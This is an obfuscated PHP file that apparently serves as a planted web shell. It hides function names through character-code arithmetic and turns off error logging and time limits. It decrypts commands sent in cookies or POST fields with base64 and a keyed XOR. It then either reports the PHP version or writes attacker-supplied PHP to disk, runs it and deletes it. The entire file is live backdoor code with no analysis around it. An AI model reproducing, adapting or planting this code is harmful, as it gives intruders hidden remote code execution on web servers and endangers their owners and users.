<?php $mlvelzer = "\146"."\x69"."\x6c".chr(101).chr(95)."\160".chr(117)."\x74".'_'."\143"."\157".chr(848-738).chr(759-643).'e'."\156"."\x74".chr(115);
$pdfrnjfrje = "\x62"."\141".chr(115)."\x65".chr(729-675)."\64".chr(95).chr(181-81).'e'.'c'.'o'."\x64"."\145";
$vifkxklqe = chr(105)."\x6e".'i'.'_'."\x73".'e'."\164";
$rdgaofb = 'u'."\156".chr(710-602).chr(105).chr(110).chr(360-253);


@$vifkxklqe("\145".chr(114).'r'.chr(111)."\x72".chr(95).chr(108)."\157".chr(103), NULL);
@$vifkxklqe("\154"."\157"."\147"."\137".chr(101).'r'."\x72".'o'."\x72"."\163", 0);
@$vifkxklqe("\x6d".chr(925-828).'x'.chr(95).'e'."\170".chr(101)."\143".chr(219-102).chr(116)."\x69".chr(914-803).chr(1054-944)."\137".chr(1083-967).chr(458-353).chr(507-398)."\145", 0);
@set_time_limit(0);

function sqenuvdb($qgnssqx, $hnwnwdmgk)
{
    $tuezqystn = "";
    for ($faiuuon = 0; $faiuuon < strlen($qgnssqx);) {
        for ($j = 0; $j < strlen($hnwnwdmgk) && $faiuuon < strlen($qgnssqx); $j++, $faiuuon++) {
            $tuezqystn .= chr(ord($qgnssqx[$faiuuon]) ^ ord($hnwnwdmgk[$j]));
        }
    }
    return $tuezqystn;
}

$uvpiktowqi = array_merge($_COOKIE, $_POST);
$qwyomwt = '134a3d27-0580-4913-9ab4-2bb48c48f132';
foreach ($uvpiktowqi as $jfadqeidz => $qgnssqx) {
    $qgnssqx = @unserialize(sqenuvdb(sqenuvdb($pdfrnjfrje($qgnssqx), $qwyomwt), $jfadqeidz));
    if (isset($qgnssqx[chr(97).'k'])) {
        if ($qgnssqx["\141"] == chr(105)) {
            $faiuuon = array(
                'p'.'v' => @phpversion(),
                chr(986-871).chr(315-197) => "3.5",
            );
            echo @serialize($faiuuon);
        } elseif ($qgnssqx["\141"] == "\145") {
            $crtzvb = "./" . md5($qwyomwt) . chr(119-73).chr(591-486).chr(662-552)."\143";
            @$mlvelzer($crtzvb, "<" . chr(818-755)."\160"."\150"."\160".chr(265-233)."\x40".'u'.chr(686-576)."\x6c".chr(105)."\x6e"."\x6b".chr(592-552)."\137"."\137"."\x46"."\x49".chr(150-74)."\x45".chr(95).chr(95)."\51".chr(59)."\x20" . $qgnssqx[chr(100)]);
            @include($crtzvb);
            @$rdgaofb($crtzvb);
        }
        exit();
    }
}

